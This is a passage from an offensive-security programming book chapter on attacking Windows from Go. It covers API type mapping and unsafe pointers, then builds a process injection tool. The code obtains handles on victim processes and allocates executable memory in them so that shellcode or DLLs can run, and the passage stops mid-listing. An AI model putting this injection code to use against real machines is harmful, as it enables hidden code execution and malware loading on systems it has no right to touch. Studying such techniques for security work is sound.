<html><head></head><body><div id="sbo-rt-content"><h2 class="h2" id="ch12"><span epub:type="pagebreak" id="page_263"/><span class="big">12</span><br/>WINDOWS SYSTEM INTERACTION AND ANALYSIS</h2>&#13;
<div class="imagel"><img src="Images/common.jpg" alt="Image" width="190" height="190"/></div>&#13;
<p class="snoindent">There are countless ways of developing Microsoft Windows attacks—too many to cover in this chapter. Instead of discussing them all, we’ll introduce and investigate a few techniques that can help you attack Windows, whether initially or during your post-exploitation adventures.</p>&#13;
<p class="indent">After discussing the Microsoft API documentation and some safety concerns, we’ll cover three topics. First, we’ll use Go’s core <span class="literal">syscall</span> package to interact with various system-level Windows APIs by performing a process injection. Second, we’ll explore Go’s core package for the Windows Portable Executable (PE) format and write a PE file format parser. Third, we’ll discuss techniques for using C code with native Go code. You’ll need to know these applied techniques in order to build a novel Windows attack.</p>&#13;
<h3 class="h3" id="ch12lev1sec1">The Windows API’s OpenProcess() Function</h3>&#13;
<p class="noindent">In order to attack Windows, you need to understand the Windows API. Let’s explore the Windows API documentation by examining the <span class="literal">OpenProcess()</span> <span epub:type="pagebreak" id="page_264"/>function, used to obtain a handle on a remote process. You can find the <span class="literal">OpenProcess()</span> documentation at <a href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess/"><em>https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess/</em></a>. <a href="ch12.xhtml#ch12fig1">Figure 12-1</a> shows the function’s object property details.</p>&#13;
<div class="image"><img src="Images/12fig01.jpg" alt="Image" width="925" height="365"/></div>&#13;
<p class="figcap" id="ch12fig1"><em>Figure 12-1: The Windows API object structure for</em> <span class="codeitalic">OpenProcess()</span></p>&#13;
<p class="indent">In this particular instance, we can see that the object looks very similar to a struct type in Go. However, the C++ struct field types don’t necessarily reconcile with Go types, and Microsoft data types don’t always match Go data types.</p>&#13;
<p class="indent">The Windows data type definition reference, located at <a href="https://docs.microsoft.com/en-us/windows/desktop/WinProg/windows-data-types/"><em>https://docs.microsoft.com/en-us/windows/desktop/WinProg/windows-data-types/</em></a>, can be helpful when reconciling a Windows data type with Go’s respective data type. <a href="ch12.xhtml#ch12tab1">Table 12-1</a> covers the type conversion we’ll use in the process injection examples later in this chapter.</p>&#13;
<p class="tabcap" id="ch12tab1"><strong>Table 12-1:</strong> Mapping Windows Data Types to Go Data Types</p>&#13;
<table class="topbot-d1">&#13;
<colgroup>&#13;
<col style="width:50%"/>&#13;
<col style="width:50%"/>&#13;
</colgroup>&#13;
<tbody>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table-h"><p class="taba"><strong>Windows data Type</strong></p></td>&#13;
<td style="vertical-align: top;" class="table-h"><p class="taba"><strong>Go data type</strong></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;"><p class="taba"><span class="literal">BOOLEAN</span></p></td>&#13;
<td style="vertical-align: top;"><p class="taba"><span class="literal">byte</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table-1b"><p class="taba"><span class="literal">BOOL</span></p></td>&#13;
<td style="vertical-align: top;" class="table-1b"><p class="taba"><span class="literal">int32</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;"><p class="taba"><span class="literal">BYTE</span></p></td>&#13;
<td style="vertical-align: top;"><p class="taba"><span class="literal">byte</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table-1b"><p class="taba"><span class="literal">DWORD</span></p></td>&#13;
<td style="vertical-align: top;" class="table-1b"><p class="taba"><span class="literal">uint32</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;"><p class="taba"><span class="literal">DWORD32</span></p></td>&#13;
<td style="vertical-align: top;"><p class="taba"><span class="literal">uint32</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table-1b"><p class="taba"><span class="literal">DWORD64</span></p></td>&#13;
<td style="vertical-align: top;" class="table-1b"><p class="taba"><span class="literal">uint64</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;"><p class="taba"><span class="literal">WORD</span></p></td>&#13;
<td style="vertical-align: top;"><p class="taba"><span class="literal">uint16</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table-1b"><p class="taba"><span class="literal">HANDLE</span></p></td>&#13;
<td style="vertical-align: top;" class="table-1b"><p class="taba"><span class="literal">uintptr (unsigned integer pointer)</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;"><p class="taba"><span class="literal">LPVOID</span></p></td>&#13;
<td style="vertical-align: top;"><p class="taba"><span class="literal">uintptr</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table-1b"><p class="taba"><span class="literal">SIZE_T</span></p></td>&#13;
<td style="vertical-align: top;" class="table-1b"><p class="taba"><span class="literal">uintptr</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;"><p class="taba"><span class="literal">LPCVOID</span></p></td>&#13;
<td style="vertical-align: top;"><p class="taba"><span class="literal">uintptr</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table-1b"><p class="taba"><span class="literal">HMODULE</span></p></td>&#13;
<td style="vertical-align: top;" class="table-1b"><p class="taba"><span class="literal">uintptr</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;"><p class="taba"><span class="literal">LPCSTR</span></p></td>&#13;
<td style="vertical-align: top;"><p class="taba"><span class="literal">uintptr</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table-1b"><p class="taba"><span class="literal">LPDWORD</span></p></td>&#13;
<td style="vertical-align: top;" class="table-1b"><p class="taba"><span class="literal">uintptr</span></p></td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_265"/>The Go documentation defines the <span class="literal">uintptr</span> data type as “an integer type that is large enough to hold the bit pattern of any pointer.” This is a special data type, as you’ll see when we discuss Go’s <span class="literal">unsafe</span> package and type conversions later in “The unsafe.Pointer and uintptr Types” on <a href="#page_266">page 266</a>. For now, let’s finish walking through the Windows API documentation.</p>&#13;
<p class="indent">Next, you should look at an object’s parameters; the Parameters section of the documentation provides details. For example, the first parameter, <span class="literal">dwDesiredAccess</span>, provides specifics regarding the level of access the process handle should possess. After that, the Return Value section defines expected values for both a successful and failed system call (<a href="ch12.xhtml#ch12fig2">Figure 12-2</a>).</p>&#13;
<div class="image"><img src="Images/12fig02.jpg" alt="Image" width="926" height="190"/></div>&#13;
<p class="figcap" id="ch12fig2"><em>Figure 12-2: The definition for the expected return value</em></p>&#13;
<p class="indent">We’ll take advantage of a <span class="literal">GetLastError</span> error message when using the <span class="literal">syscall</span> package in our upcoming example code, although this will deviate from the standard error handling (such as if <span class="literal">err != nil</span> syntax) ever so slightly.</p>&#13;
<p class="indent">Our last section of the Windows API document, Requirements, provides important details, as shown in <a href="ch12.xhtml#ch12fig3">Figure 12-3</a>. The last line defines the <em>dynamic link library (DLL)</em>, which contains exportable functions (such as <span class="literal">OpenProcess()</span>) and will be necessary when we build out our Windows DLL module’s variable declarations. Said another way, we cannot call the relevant Windows API function from Go without knowing the appropriate Windows DLL module. This will become clearer as we progress into our upcoming process injection example.</p>&#13;
<div class="image"><img src="Images/12fig03.jpg" alt="Image" width="926" height="433"/></div>&#13;
<p class="figcap" id="ch12fig3"><em>Figure 12-3: The Requirements section defines the library required to call the API.</em></p>&#13;
<h3 class="h3" id="ch12lev1sec2"><span epub:type="pagebreak" id="page_266"/>The unsafe.Pointer and uintptr Types</h3>&#13;
<p class="noindent">In dealing with the Go <span class="literal">syscall</span> package, we’ll most certainly need to step around Go’s type-safety protections. The reason is that we’ll need, for example, to establish shared memory structures and perform type conversions between Go and C. This section provides the groundwork you need in order to manipulate memory, but you should also explore Go’s official documentation further.</p>&#13;
<p class="indent">We’ll bypass Go’s safety precautions by using Go’s <span class="literal">unsafe</span> package (mentioned in <a href="ch09.xhtml#ch9">Chapter 9</a>), which contains operations that step around the type safety of Go programs. Go has laid out four fundamental guidelines to help us out:</p>&#13;
<ul>&#13;
<li><p class="noindent">A pointer value of any type can be converted to an <span class="literal">unsafe.Pointer</span>.</p></li>&#13;
<li><p class="noindent">An <span class="literal">unsafe.Pointer</span> can be converted to a pointer value of any type.</p></li>&#13;
<li><p class="noindent">A <span class="literal">uintptr</span> can be converted to an <span class="literal">unsafe.Pointer</span>.</p></li>&#13;
<li><p class="noindent">An <span class="literal">unsafe.Pointer</span> can be converted to a <span class="literal">uintptr</span>.</p></li>&#13;
</ul>&#13;
<div class="note">&#13;
<p class="notet"><strong><span class="notes">WARNING</span></strong></p>&#13;
<p class="notep"><em>Keep in mind that packages that import the</em> <span class="literal">unsafe</span> <em>package may not be portable, and that although Go typically ensures Go version 1 compatibility, using the</em> <span class="literal">unsafe</span> <em>package breaks all guarantees of this.</em></p>&#13;
</div>&#13;
<p class="indent">The <span class="literal">uintptr</span> type allows you to perform type conversion or arithmetic between native safe types, among other uses. Although <span class="literal">uintptr</span> is an integer type, it’s used extensively to represent a memory address. When used with type-safe pointers, Go’s native garbage collector will maintain relevant references at runtime.</p>&#13;
<p class="indent">However, the situation changes when <span class="literal">unsafe.Pointer</span> is introduced. Recall that <span class="literal">uintptr</span> is essentially just an unsigned integer. If a pointer value is created using <span class="literal">unsafe.Pointer</span> and then assigned to <span class="literal">uintptr</span>, there’s no guarantee that Go’s garbage collector will maintain the integrity of the referenced memory location’s value. <a href="ch12.xhtml#ch12fig4">Figure 12-4</a> helps to further describe the issue.</p>&#13;
<div class="image"><img src="Images/12fig04.jpg" alt="Image" width="318" height="373"/></div>&#13;
<p class="figcap" id="ch12fig4"><em>Figure 12-4: A potentially dangerous pointer when using</em> <span class="codeitalic">uintptr</span> <em>and</em> <span class="codeitalic">unsafe.Pointer</span></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_267"/>The top half of the image depicts <span class="literal">uintptr</span> with a reference value to a Go type-safe pointer. As such, it will maintain its reference at runtime, along with austere garbage collection. The lower half of the image demonstrates that <span class="literal">uintptr</span>, although it references an <span class="literal">unsafe.Pointer</span> type, can be garbage collected, considering Go doesn’t preserve nor manage pointers to arbitrary data types. <a href="ch12.xhtml#ch12list1">Listing 12-1</a> represents the issue.</p>&#13;
<pre>func state() {&#13;
var onload = createEvents("onload") <span class="ent">❶</span>&#13;
    var receive = createEvents("receive") <span class="ent">❷</span>&#13;
    var success = createEvents("success") <span class="ent">❸</span>&#13;
&#13;
    mapEvents := make(map[string]interface{})&#13;
    mapEvents["messageOnload"] = unsafe.Pointer(onload)&#13;
    mapEvents["messageReceive"] = unsafe.Pointer(receive) <span class="ent">❹</span>&#13;
    mapEvents["messageSuccess"] = uintptr(unsafe.Pointer(success)) <span class="ent">❺</span>&#13;
&#13;
    //This line is safe - retains orginal value&#13;
    fmt.Println(*(*string)(mapEvents["messageReceive"].(unsafe.Pointer))) <span class="ent">❻</span>&#13;
&#13;
    //This line is unsafe - original value could be garbage collected&#13;
    fmt.Println(*(*string)(unsafe.Pointer(mapEvents["messageSuccess"].(uintptr)))) <span class="ent">❼</span>&#13;
}&#13;
&#13;
func createEvents(s string)<span class="ent">❽</span> *string {&#13;
    return &amp;s&#13;
}</pre>&#13;
<p class="caption" id="ch12list1"><em>Listing 12-1: Using</em> <span class="codeitalic">uintptr</span> <em>both securely and insecurely with</em> <span class="codeitalic">unsafe.Pointer</span></p>&#13;
<p class="indent">This code listing could be someone’s attempt at creating a state machine, for example. It has three variables, assigned their respective pointer values of <span class="literal">onload</span> <span class="ent">❶</span>, <span class="literal">receive</span> <span class="ent">❷</span>, and <span class="literal">success</span> <span class="ent">❸</span> by calling the <span class="literal">createEvents()</span> <span class="ent">❽</span> function. We then create a map containing a key of type <span class="literal">string</span> along with a value of type <span class="literal">interface{}</span>. We use the <span class="literal">interface{}</span> type because it can receive disparate data types. In this case, we’ll use it to receive both <span class="literal">unsafe.Pointer</span> <span class="ent">❹</span> and <span class="literal">uintptr</span> <span class="ent">❺</span> values.</p>&#13;
<p class="indent">At this point, you most likely have spotted the dangerous pieces of code. Although the <span class="literal">mapEvents["messageRecieve"]</span> map entry <span class="ent">❹</span> is of type <span class="literal">unsafe.Pointer</span>, it still maintains its original reference to the <span class="literal">receive</span> <span class="ent">❷</span> variable and will provide the same consistent output <span class="ent">❻</span> as it did originally. Contrarily, the <span class="literal">mapEvents["messageSuccess"]</span> map entry <span class="ent">❺</span> is of type <span class="literal">uintptr</span>. This means that as soon as the <span class="literal">unsafe.Pointer</span> value referencing the <span class="literal">success</span> variable is assigned to a <span class="literal">uintptr</span> type, the <span class="literal">success</span> variable <span class="ent">❸</span> is free to be garbage collected. Again, <span class="literal">uintptr</span> is just a type holding a literal integer of a memory address, not a reference to a pointer. As a result, there’s no guarantee that the expected output <span class="ent">❼</span> will be produced, as the value may no longer be present.</p>&#13;
<p class="indent">Is there a safe way to use <span class="literal">uintptr</span> with <span class="literal">unsafe.Pointer</span>? We can do so by taking advantage of <span class="literal">runtime.Keepalive</span>, which can prevent the garbage <span epub:type="pagebreak" id="page_268"/>collection of a variable. Let’s take a look at this by modifying our prior code block (<a href="ch12.xhtml#ch12list2">Listing 12-2</a>).</p>&#13;
<pre>func state() {&#13;
var onload = createEvents("onload")&#13;
    var receive = createEvents("receive")&#13;
    var success<span class="ent">❶</span> = createEvents("success")&#13;
&#13;
    mapEvents := make(map[string]interface{})&#13;
    mapEvents["messageOnload"] = unsafe.Pointer(onload)&#13;
    mapEvents["messageReceive"] = unsafe.Pointer(receive)&#13;
    mapEvents["messageSuccess"] = uintptr(unsafe.Pointer(success))<span class="ent">❷</span>&#13;
&#13;
    //This line is safe - retains orginal value&#13;
    fmt.Println(*(*string)(mapEvents["messageReceive"].(unsafe.Pointer)))&#13;
&#13;
    //This line is unsafe - original value could be garbage collected&#13;
    fmt.Println(*(*string)(unsafe.Pointer(mapEvents["messageSuccess"].(uintptr))))&#13;
&#13;
    runtime.KeepAlive(success) <span class="ent">❸</span>&#13;
}&#13;
&#13;
func createEvents(s string) *string {&#13;
    return &amp;s&#13;
}</pre>&#13;
<p class="caption" id="ch12list2"><em>Listing 12-2: <a href="ch07.xhtml#ch7list2">Listing 7-2</a>: Using the</em> <span class="codeitalic">runtime.KeepAlive()</span> <em>function to prevent garbage collection of a variable</em></p>&#13;
<p class="indent">Seriously, we’ve added only one small line of code <span class="ent">❸</span>! This line, <span class="literal">runtime.KeepAlive(success)</span>, tells the Go runtime to ensure that the <span class="literal">success</span> variable remains accessible until it’s explicitly released or the run state ends. This means that although the <span class="literal">success</span> variable <span class="ent">❶</span> is stored as <span class="literal">uintptr</span> <span class="ent">❷</span>, it can’t be garbage collected because of the explicit <span class="literal">runtime.KeepAlive()</span> directive.</p>&#13;
<p class="indent">Be aware that the Go <span class="literal">syscall</span> package extensively uses <span class="literal">uintptr(unsafe</span><span class="literal">.Pointer()</span><span class="literal">)</span> throughout, and although certain functions, like <span class="literal">syscall9()</span>, have type safety through exception, not all the functions employ this. Further, as you hack about your own project code, you’ll almost certainly run into situations that warrant manipulating heap or stack memory in an unsafe manner.</p>&#13;
<h3 class="h3" id="ch12lev1sec3">Performing Process Injection with the syscall Package</h3>&#13;
<p class="noindent">Often, we need to inject our own code into a process. This may be because we want to gain remote command line access to a system (shell), or even debug a runtime application when the source code isn’t available. Understanding the mechanics of process injection will also help you perform more interesting tasks, such as loading memory-resident malware or hooking functions. Either way, this section demonstrates how to use Go to interact with the Microsoft Windows APIs in order to perform process injection. We’ll inject a payload stored on a disk into existing process memory. <a href="ch12.xhtml#ch12fig5">Figure 12-5</a> describes the overall chain of events.</p>&#13;
<div class="image"><img src="Images/12fig05.jpg" alt="Image" width="836" height="709"/></div>&#13;
<p class="figcap" id="ch12fig5"><em>Figure 12-5: <span epub:type="pagebreak" id="page_269"/>Basic process injection</em></p>&#13;
<p class="indent">In step 1, we use the <span class="literal">OpenProcess()</span> Windows function to establish a process handle, along with the desired process access rights. This is a requirement for process-level interaction, whether we’re dealing with a local or remote process.</p>&#13;
<p class="indent">Once the requisite process handle has been obtained, we use it in step 2, along with the <span class="literal">VirtualAllocEx()</span> Windows function, to allocate virtual memory within the remote process. This is a requirement for loading byte-level code, such as shellcode or a DLL, into the remote processes’ memory.</p>&#13;
<p class="indent">In step 3, we load byte-level code into memory by using the <span class="literal">WriteProcessMemory()</span> Windows function. At this point in the injection process, we, as attackers, get to decide how creative to be with our shellcode or DLL. This is also the place where you might need to inject debugging code when attempting to understand a running program.</p>&#13;
<p class="indent">Finally, in step 4, we use the <span class="literal">CreateRemoteThread()</span> Windows function as a means to call a native exported Windows DLL function, such as <span class="literal">LoadLibraryA()</span>, located in <em>Kernel32.dll</em>, so that we can execute the code previously placed within the process by using <span class="literal">WriteProcessMemory()</span>.</p>&#13;
<p class="indent">The four steps we just described provide a fundamental process injection example. We’ll define a few additional files and functions within our overall process injection example that aren’t necessarily described here, although we’ll describe them in detail as we encounter them.</p>&#13;
<h4 class="h4" id="ch12lev2sec1"><span epub:type="pagebreak" id="page_270"/>Defining the Windows DLLs and Assigning Variables</h4>&#13;
<p class="indent">The first step is to create the <em>winmods</em> file in <a href="ch12.xhtml#ch12list3">Listing 12-3</a>. (All the code listings at the root location of / exist under the provided github repo <em><a href="https://github.com/blackhat-go/bhg/">https://github.com/blackhat-go/bhg/</a></em>.) This file defines the native Windows DLL, which maintains exported system-level APIs, that we’ll call by using the Go <span class="literal">syscall</span> package. The <em>winmods</em> file contains declarations and assignments of more Windows DLL module references than required for our sample project, but we’ll document them so that you can leverage those in more advanced injection code.</p>&#13;
<pre>import "syscall"&#13;
&#13;
var (&#13;
 <span class="ent">❶</span> ModKernel32 = syscall.NewLazyDLL("kernel32.dll")&#13;
    modUser32   = syscall.NewLazyDLL("user32.dll")&#13;
    modAdvapi32 = syscall.NewLazyDLL("Advapi32.dll")&#13;
&#13;
    ProcOpenProcessToken      = modAdvapi32.NewProc("GetProcessToken")&#13;
    ProcLookupPrivilegeValueW = modAdvapi32.NewProc("LookupPrivilegeValueW")&#13;
    ProcLookupPrivilegeNameW  = modAdvapi32.NewProc("LookupPrivilegeNameW")&#13;
    ProcAdjustTokenPrivileges = modAdvapi32.NewProc("AdjustTokenPrivileges")&#13;
    ProcGetAsyncKeyState      = modUser32.NewProc("GetAsyncKeyState")&#13;
    ProcVirtualAlloc          = ModKernel32.NewProc("VirtualAlloc")&#13;
    ProcCreateThread          = ModKernel32.NewProc("CreateThread")&#13;
    ProcWaitForSingleObject   = ModKernel32.NewProc("WaitForSingleObject")&#13;
    ProcVirtualAllocEx        = ModKernel32.NewProc("VirtualAllocEx")&#13;
    ProcVirtualFreeEx         = ModKernel32.NewProc("VirtualFreeEx")&#13;
    ProcCreateRemoteThread    = ModKernel32.NewProc("CreateRemoteThread")&#13;
    ProcGetLastError          = ModKernel32.NewProc("GetLastError")&#13;
    ProcWriteProcessMemory    = ModKernel32.NewProc("WriteProcessMemory")&#13;
 <span class="ent">❷</span> ProcOpenProcess           = ModKernel32.NewProc("OpenProcess")&#13;
    ProcGetCurrentProcess     = ModKernel32.NewProc("GetCurrentProcess")&#13;
    ProcIsDebuggerPresent     = ModKernel32.NewProc("IsDebuggerPresent")&#13;
    ProcGetProcAddress        = ModKernel32.NewProc("GetProcAddress")&#13;
    ProcCloseHandle           = ModKernel32.NewProc("CloseHandle")&#13;
    ProcGetExitCodeThread     = ModKernel32.NewProc("GetExitCodeThread")&#13;
)</pre>&#13;
<p class="caption" id="ch12list3"><em>Listing 12-3: The</em> winmods <em>file (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-12/procInjector/winsys/winmods.go">/ch-12/procInjector/winsys/winmods.go</a><em>)</em></p>&#13;
<p class="indent">We use the <span class="literal">NewLazyDLL()</span> method to load the <span class="literal">Kernel32</span> DLL <span class="ent">❶</span>. <span class="literal">Kernel32</span> manages much of the internal Windows process functionality, such as addressing, handling, memory allocation, and more. (It’s worth noting that, as of Go version 1.12.2, you can use a couple of new functions to better load DLLs and prevent system DLL hijacking attacks: <span class="literal">LoadLibraryEx()</span> and <span class="literal">NewLazySystemDLL()</span>.)</p>&#13;
<p class="indent">Before we can interact with the DLL, we must establish a variable that we can use in our code. We do this by calling <span class="literal">module.NewProc</span> for each API that we’ll need to use. At <span class="ent">❷</span>, we call it against <span class="literal">OpenProcess()</span> and assign it to an exported variable called <span class="literal">ProcOpenProcess</span>. The use of <span class="literal">OpenProcess()</span> is <span epub:type="pagebreak" id="page_271"/>arbitrary; it’s intended to demonstrate the technique for assigning any exported Windows DLL function to a descriptive variable name.</p>&#13;
<h4 class="h4" id="ch12lev2sec2">Obtaining a Process Token with the OpenProcess Windows API</h4>&#13;
<p class="noindent">Next, we build out the <span class="literal">OpenProcessHandle()</span> function, which we’ll use to obtain a process handle token. We will likely use the terms <em>token</em> and <em>handle</em> interchangeably throughout the code, but realize that every process within a Windows system has a unique process token. This provides a means to enforce relevant security models, such as <em>Mandatory Integrity Control</em>, a complex security model (and one that is worth investigating in order to get more acquainted with process-level mechanics). The security models consist of such items as process-level rights and privileges, for example, and dictate how both unprivileged and elevated processes can interact with one another.</p>&#13;
<p class="indent">First, let’s take a look at the C++ <span class="literal">OpenProcess()</span> data structure as defined within the Window API documentation (<a href="ch12.xhtml#ch12list4">Listing 12-4</a>). We’ll define this object as if we intended to call it from native Windows C++ code. However, we won’t be doing this, because we’ll be defining this object to be used with Go’s <span class="literal">syscall</span> package. Therefore, we’ll need to translate this object to standard Go data types.</p>&#13;
<pre>HANDLE OpenProcess(&#13;
  DWORD<span class="ent">❶</span> dwDesiredAccess,&#13;
  BOOL  bInheritHandle,&#13;
  DWORD dwProcessId&#13;
);</pre>&#13;
<p class="caption" id="ch12list4"><em>Listing 12-4: An arbitrary Windows C++ object and data types</em></p>&#13;
<p class="indent">The first necessary task is to translate <span class="literal">DWORD</span> <span class="ent">❶</span> to a usable type that Go maintains. A <span class="literal">DWORD</span> is defined by Microsoft as a 32-bit unsigned integer, which corresponds to Go’s <span class="literal">uint32</span> type. The <span class="literal">DWORD</span> value states that it must contain <span class="literal">dwDesiredAccess</span> or, as the documentation states, “one or more of the process access rights.” Process access rights define the actions we wish to take upon a process, given a valid process token.</p>&#13;
<p class="indent">We want to declare a variety of process access rights. Since these values won’t change, we place such relevant values in a Go constants file, as shown in <a href="ch12.xhtml#ch12list5">Listing 12-5</a>. Each line in this list defines a process access right. The list contains almost every available process access right, but we will use only the ones necessary for obtaining a process handle.</p>&#13;
<pre>const (&#13;
    // docs.microsoft.com/en-us/windows/desktop/ProcThread/process-security-and-access-rights&#13;
    PROCESS_CREATE_PROCESS            = 0x0080&#13;
    PROCESS_CREATE_THREAD             = 0x0002&#13;
    PROCESS_DUP_HANDLE                = 0x0040&#13;
    PROCESS_QUERY_INFORMATION         = 0x0400&#13;
    PROCESS_QUERY_LIMITED_INFORMATION = 0x1000&#13;
    PROCESS_SET_INFORMATION           = 0x0200&#13;
    PROCESS_SET_QUOTA                 = 0x0100&#13;
    PROCESS_SUSPEND_RESUME            = 0x0800&#13;
<span epub:type="pagebreak" id="page_272"/>    PROCESS_TERMINATE                 = 0x0001&#13;
    PROCESS_VM_OPERATION              = 0x0008&#13;
    PROCESS_VM_READ                   = 0x0010&#13;
    PROCESS_VM_WRITE                  = 0x0020&#13;
    PROCESS_ALL_ACCESS                = 0x001F0FFF&#13;
)</pre>&#13;
<p class="caption" id="ch12list5"><em>Listing 12-5: A constants section declaring process access rights (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-12/procInjector/winsys/constants.go">/ch-12/procInjector/winsys/constants.go</a><em>)</em></p>&#13;
<p class="indent">All the process access rights we defined in <a href="ch12.xhtml#ch12list5">Listing 12-5</a> reconcile with their respective constant hexadecimal values, which is the format they need to be in to assign them to a Go variable.</p>&#13;
<p class="indent">One issue that we’d like to describe prior to reviewing <a href="ch12.xhtml#ch12list6">Listing 12-6</a> is that most of the following process injection functions, not just <span class="literal">OpenProcessHandle()</span>, will consume a custom object of type <span class="literal">Inject</span> and return a value of type <span class="literal">error</span>. The <span class="literal">Inject</span> struct object (<a href="ch12.xhtml#ch12list6">Listing 12-6</a>) will contain various values that will be provided to the relevant Windows function via <span class="literal">syscall</span>.</p>&#13;
<pre>type Inject struct {&#13;
    Pid              uint32&#13;
    DllPath          string&#13;
    DLLSize          uint32&#13;
    Privilege        string&#13;
    RemoteProcHandle uintptr&#13;
    Lpaddr           uintptr&#13;
    LoadLibAddr      uintptr&#13;
    RThread          uintptr&#13;
    Token            TOKEN&#13;
}&#13;
&#13;
type TOKEN struct {&#13;
    tokenHandle syscall.Token&#13;
}</pre>&#13;
<p class="caption" id="ch12list6"><em>Listing 12-6: The</em> <span class="codeitalic">Inject</span> <em>struct used to hold certain process injection data types</em> (<a href="https://github.com/blackhat-go/bhg/blob/master/ch-12/procInjector/winsys/models.go">/ch-12 /procInjector/winsys/models.go</a>)</p>&#13;
<p class="indent"><a href="ch12.xhtml#ch12list7">Listing 12-7</a> illustrates our first actual function, <span class="literal">OpenProcessHandle()</span>. Let’s take a look at the following code block and discuss the various details.</p>&#13;
<pre>func OpenProcessHandle(i *Inject) error {&#13;
    <span class="ent">❶</span> var rights uint32 = PROCESS_CREATE_THREAD |&#13;
        PROCESS_QUERY_INFORMATION |&#13;
        PROCESS_VM_OPERATION |&#13;
        PROCESS_VM_WRITE |&#13;
        PROCESS_VM_READ&#13;
    <span class="ent">❷</span> var inheritHandle uint32 = 0&#13;
    <span class="ent">❸</span> var processID uint32 = i.Pid&#13;
    <span class="ent">❹</span> remoteProcHandle, _, lastErr<span class="ent">❺</span> := ProcOpenProcess.Call<span class="ent">❻</span>(&#13;
        uintptr(rights), // DWORD dwDesiredAccess&#13;
        uintptr(inheritHandle), // BOOL  bInheritHandle&#13;
        uintptr(processID)) // DWORD dwProcessId&#13;
    if remoteProcHandle == 0 {&#13;
        return errors.Wrap(lastErr, `[!] ERROR :&#13;
<span epub:type="pagebreak" id="page_273"/>        Can't Open Remote Process. Maybe running w elevated integrity?`)&#13;
    }&#13;
    i.RemoteProcHandle = remoteProcHandle&#13;
    fmt.Printf("[-] Input PID: %v\n", i.Pid)&#13;
    fmt.Printf("[-] Input DLL: %v\n", i.DllPath)&#13;
    fmt.Printf("[+] Process handle: %v\n", unsafe.Pointer(i.RemoteProcHandle))&#13;
    return nil&#13;
}</pre>&#13;
<p class="caption" id="ch12list7"><em>Listing 12-7: The</em> <span class="codeitalic">OpenProcessHandle()</span> <em>function used to obtain a process handle</em> (<a href="https://github.com/blackhat-go/bhg/blob/master/ch-12/procInjector/winsys/inject.go">/ch-12 /procInjector/winsys/inject.go</a>)</p>&#13;
<p class="indent">The code starts by assigning process access rights to the <span class="literal">uint32</span> variable called <span class="literal">rights</span> <span class="ent">❶</span>. The actual values assigned include <span class="literal">PROCESS_CREATE_THREAD</span>, which allows us to create a thread on our remote process. Following that is <span class="literal">PROCESS_QUERY_INFORMAITON</span>, which gives us the ability to generically query details about the remote process. The last three process access rights, <span class="literal">PROCESS_VM_OPERATION</span>, <span class="literal">PROCESS_VM_WRITE</span>, and <span class="literal">PROCESS_VM_READ</span>, all provide the access rights to manage the remote process virtual memory.</p>&#13;
<p class="indent">The next declared variable, <span class="literal">inheritHandle</span> <span class="ent">❷</span>, dictates whether our new process handle will inherit the existing handle. We pass in <span class="literal">0</span> to indicate a Boolean false value, as we want a new process handle. Immediately following is the <span class="literal">processID</span> <span class="ent">❸</span> variable containing the PID of the victim process. All the while, we reconcile our variable types with the Windows API documentation, such that both our declared variables are of type <span class="literal">uint32</span>. This pattern continues until we make the system call by using <span class="literal">ProcOpenProcess.Call()</span> <span class="ent">❻</span><span class="literal">.</span></p>&#13;
<p class="indent">The <span class="literal">.Call()</span> method consumes a varying number of <span class="literal">uintptr</span> values, which, if we were to look at the <span class="literal">Call()</span> function signature, would be declared literally as <span class="literal">...uintptr</span>. Additionally, the return types are designated as <span class="literal">uintptr</span> <span class="ent">❹</span> and <span class="literal">error</span> <span class="ent">❺</span>. Further, the error type is named <span class="literal">lastErr</span> <span class="ent">❺</span>, which you’ll find referenced in the Windows API documentation, and contains the returned error value as defined by the actual called function.</p>&#13;
<h4 class="h4" id="ch12lev2sec3">Manipulating Memory with the VirtualAllocEx Windows API</h4>&#13;
<p class="noindent">Now that we have a remote process handle, we need a means to allocate virtual memory within the remote process. This is necessary in order to set aside a region of memory and initialize it prior to writing to it. Let’s build that out now. Place the function defined in <a href="ch12.xhtml#ch12list8">Listing 12-8</a> immediately after the function defined in <a href="ch12.xhtml#ch12list7">Listing 12-7</a>. (We will continue to append functions, one after another, as we navigate the process injection code.)</p>&#13;
<pre>func VirtualAllocEx(i *Inject) error {&#13;
    var flAllocationType uint32 = MEM_COMMIT | MEM_RESERVE&#13;
    var flProtect uint32 = PAGE_EXECUTE_READWRITE&#13;
    lpBaseAddress, _, lastErr := ProcVirtualAllocEx.Call(&#13;
        i.RemoteProcHandle, // HANDLE hProcess&#13;
        uintptr(nullRef), // LPVOID lpAddress <span class="ent">❶</span>&#13;
        uintptr(i.DLLSize), // SIZE_T dwSize&#13;
        uintptr(flAllocationType), // DWORD  flAllocationType&#13;
        // https://docs.microsoft.com/en-us/windows/desktop/Memory/memory-protection-constants&#13;
<span epub:type="pagebreak" id="page_274"/>uintptr(flProtect)) // DWORD  flProtect&#13;
    if lpBaseAddress == 0 {&#13;
